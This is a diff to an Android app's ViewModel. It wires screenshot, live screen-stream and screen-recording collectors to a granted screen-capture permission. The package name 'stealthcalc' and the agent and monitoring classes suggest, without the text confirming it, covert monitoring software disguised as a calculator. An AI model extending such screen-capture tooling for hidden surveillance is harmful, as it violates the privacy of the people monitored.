@@ -1,9 +1,13 @@
 package com.stealthcalc.monitoring.ui
 
 import android.content.Context
+import android.content.Intent
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
 import com.stealthcalc.core.logging.AppLogger
+import com.stealthcalc.monitoring.collector.ScreenRecordCollector
+import com.stealthcalc.monitoring.collector.ScreenStreamCollector
+import com.stealthcalc.monitoring.collector.ScreenshotCollector
 import com.stealthcalc.monitoring.data.MonitoringRepository
 import com.stealthcalc.monitoring.network.AgentApiClient
 import com.stealthcalc.monitoring.service.AgentService
@@ -37,6 +41,9 @@ class AgentConfigViewModel @Inject constructor(
     @ApplicationContext private val context: Context,
     private val repository: MonitoringRepository,
     private val apiClient: AgentApiClient,
+    private val screenshotCollector: ScreenshotCollector,
+    private val screenStreamCollector: ScreenStreamCollector,
+    private val screenRecordCollector: ScreenRecordCollector,
 ) : ViewModel() {
 
     private val _state = MutableStateFlow(
@@ -148,5 +155,12 @@ class AgentConfigViewModel @Inject constructor(
     fun stopService() {
         AgentService.stop(context)
         _state.update { it.copy(isServiceRunning = false) }
+    }
+
+    fun onScreenCaptureGranted(resultCode: Int, data: Intent) {
+        screenshotCollector.setMediaProjection(resultCode, data)
+        screenStreamCollector.setMediaProjection(resultCode, data)
+        screenRecordCollector.setMediaProjection(resultCode, data)
+        AppLogger.log(context, "[agent]", "Screen capture permission granted")
     }
 }
